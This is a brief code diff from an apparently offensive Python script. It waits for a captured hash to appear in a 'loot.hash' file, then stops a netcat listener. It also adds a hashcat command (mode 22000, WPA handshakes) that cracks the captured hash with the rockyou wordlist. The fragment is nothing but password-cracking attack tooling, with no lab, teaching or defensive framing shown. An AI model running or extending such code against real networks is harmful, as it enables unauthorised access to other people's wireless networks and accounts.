@@ -76,9 +76,11 @@ while True:
 	loot = hashes.read()
 	if loot != '':
 		print(f"loot.hash contains {loot}")
+		nc_listener.kill()
 		break
 	else:
 		time.sleep(5)
 
 # time to crack the hash
 
+subprocess.Popen(['hashcat -m 22000 loot.hash /usr/share/wordlists/rockyou.txt'], shell=True)
